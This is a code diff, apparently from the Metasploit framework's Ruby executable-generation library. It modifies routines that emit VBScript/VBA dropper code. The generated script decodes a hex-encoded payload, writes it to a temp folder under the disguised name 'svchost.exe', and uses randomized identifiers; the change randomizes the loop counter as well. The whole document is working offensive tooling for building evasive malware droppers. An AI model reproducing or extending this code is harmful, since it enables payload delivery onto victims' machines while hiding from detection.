@@ -921,6 +921,7 @@ End Sub
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_counter = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Function #{var_func}()\r\n"
 		vbs << "#{var_bytes}=\"#{exe}\"\r\n"
@@ -931,18 +932,19 @@ End Sub
 		vbs << "Dim #{var_tempdir}\r\n"
 		vbs << "Dim #{var_tempexe}\r\n"
 		vbs << "Dim #{var_basedir}\r\n"
+		vbs << "Dim #{var_counter}\r\n"
 		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
 		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
 		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe}, true , false)\r\n"
-
-		vbs << "For x = 1 To Len(#{var_bytes})-3 Step 2\r\n"
-		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, x, 2)\r\n"
+		vbs << "#{var_counter} = 1\r\n"
+		vbs << "For #{var_counter} = 1 To Len(#{var_bytes})-3 Step 2\r\n"
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, #{var_counter}, 2)\r\n"
 		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
 		vbs << "Next\r\n"
-
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes},#{var_counter})\r\n"
 		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
 
 		vbs << "#{var_stream}.Close\r\n"
@@ -976,6 +978,7 @@ End Sub
 		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
 		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_counter = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Sub #{var_func}()\r\n"
 		vbs << "#{var_bytes}=\"#{exe}\"\r\n"
@@ -986,17 +989,20 @@ End Sub
 		vbs << "Dim #{var_tempdir}\r\n"
 		vbs << "Dim #{var_tempexe}\r\n"
 		vbs << "Dim #{var_basedir}\r\n"
+		vbs << "Dim #{var_counter}\r\n"
 		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"
 
 		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
 		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
 		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
 		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
-		vbs << "For x = 1 To Len(#{var_bytes})-3 Step 2\r\n"
-		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, x, 2)\r\n"
+		vbs << "#{var_counter} = 1\r\n"
+		vbs << "For #{var_counter} = 1 To Len(#{var_bytes})-3 Step 2\r\n"
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes}, #{var_counter}, 2)\r\n"
 		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
 		vbs << "Next\r\n"
 
+		vbs << "#{var_byte} = Chr(38) & \"H\" & Mid(#{var_bytes},#{var_counter})\r\n"
 		vbs << "#{var_stream}.write Chr(#{var_byte})\r\n"
 
 		vbs << "#{var_stream}.Close\r\n"
